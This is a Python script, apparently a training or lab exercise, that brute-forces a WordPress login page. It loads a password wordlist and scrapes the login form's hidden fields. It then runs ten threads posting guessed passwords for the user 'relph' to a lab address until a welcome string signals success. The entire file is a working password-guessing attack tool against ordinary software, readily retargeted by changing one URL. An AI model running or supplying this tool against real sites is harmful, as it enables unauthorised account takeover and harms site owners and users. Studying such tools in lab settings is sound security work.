import threading 
import time
from queue import Queue
from io import BytesIO
import requests
from lxml import etree

SUCCESS = "歡迎使用 WordPress!"
TARGET = "http://192.168.56.101/wordpress/wp-login.php"
WORDLIST = "./seclists/cain-and-abel.txt"

def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()
    
    # 單線程： words = [], 多線程： words = Queue()
    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words

def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    # 解析 content
    tree = etree.parse(BytesIO(content), parser=parser)
    # 遍歷所有的 input 元素 
    for elem in tree.findall("//input"):
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params

class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f"\nBrute Force Attack beginning on {url}.\n")
        print(f"Finished the setup where username = {username}\n")

    def run_bruteforce(self, passwords):
        mythreads = list()
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start() 
        for thread in mythreads:
            thread.join()

    def web_bruter(self, passwords):
        # 初始化會話
        session = requests.Session()
        resp0 = session.get(self.url)   
        params = get_params(resp0.content)
        params['log'] = self.username

        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            # <:  left-aligned within the available space.
            # 10: the width of the field. In this case, it's set to 10 characters.
            print(f"Trying username/password {self.username}/{passwd:<10}")
            params['pwd'] = passwd

            # 請求登陸，如果使用最新的 Wordpress，已經屏蔽重放的漏洞
            # params: params['log'] = self.username, params['pwd'] = passwd
            resp1 = session.post(self.url, data=params)
            if SUCCESS in resp1.content.decode():
                self.found = True
                print(f"\n Bruteforcing successful.")
                print("Username is %s" % self.username)
                print("Password is %s" % params['pwd'])
                print("done: now cleaning up other threads")

if __name__ == '__main__':
    words = get_words()
    # username: 'relph
    b = Bruter('relph', TARGET)
    b.run_bruteforce(words)